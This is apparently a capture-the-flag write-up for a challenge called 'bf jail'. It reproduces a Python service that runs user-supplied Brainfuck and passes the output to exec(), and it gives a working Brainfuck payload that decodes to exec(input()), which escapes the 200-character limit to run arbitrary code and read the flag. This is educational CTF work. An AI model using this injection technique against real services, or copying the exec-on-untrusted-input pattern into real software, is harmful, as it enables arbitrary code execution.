### bf jail [127]
`**author: dfoo**`
**Jail but with my best friend? That doesn’t sound too bad. Oh wait…**
`**nc chal.wwctf.com 6002**`
and we had a `**chall.py**` file with it which had:

```python
#!/usr/bin/env python3
import sys


def bf(code):
    output = ""
    s = []
    matches = {}
    tape = [0] * 1000000
    for i, j in enumerate(code):
        if j == "[":
            s.append(i)
        if j == "]":
            m = s.pop()
            matches[m] = i
            matches[i] = m
    cp = 0
    p = 0
    while cp < len(code):
        if code[cp] == "+":
            tape[p] = (tape[p] + 1) % 256
        if code[cp] == "-":
            tape[p] = (tape[p] - 1) % 256
        if code[cp] == ",":
            c = sys.stdin.read(1)
            tape[p] = (ord(c) if c else 0) % 256
        if code[cp] == ".":
            output += chr(tape[p])
        if code[cp] == "<":
            p -= 1
        if code[cp] == ">":
            p += 1
        if code[cp] == "[":
            if not tape[p]:
                cp = matches[cp]
        if code[cp] == "]":
            if tape[p]:
                cp = matches[cp]
        cp += 1

    return output


if __name__ == "__main__":
    code = input("> ")
    if len(code) > 200:
        print("200 chars max")
        sys.exit(0)
    if not all(c in set("+-<>[],.") for c in code):
        print("nope")
        exit(0)
    code = bf(code)
    exec(code)
```

Reading the code, we can understand that the challenge is letting the user inject some python code, but here is the tricky part, it need to be written with the brainfuck interpretation.

What you would like to do here is to simply list all the files and then read the file that has the flag. **BUT**, the author added a 200 chars max limit. and anything like:
```python
import os; print(os.listdir())
```
or:
```python
print(open("flag.txt").read())
```
Would exceed the 200 chars limit when written in Brainfuck

Going back to code, we can see that the author is calling a function called `**exec()**` to execute his code, so the trick here is we want to use that to open a window where we can push our code then **`exec()`** it too.

and here is what I tried:
```python
exec(input())
```
which is :
```brainfuck
--[----->+<]>-.[--->+<]>+.-[->+++<]>.--.[->+++<]>-.-----[->+++<]>.+++++.++.+++++.-.+[--->+<]>+.+..>++++++++++.
```
in Brainfuck and it is less then 200 chars (110).

and injecting that gave me an input window where i can simply put any code I want:
![[Pasted image 20250728212010.png]]
so, I just completed simply with:
![[Pasted image 20250728212100.png]]
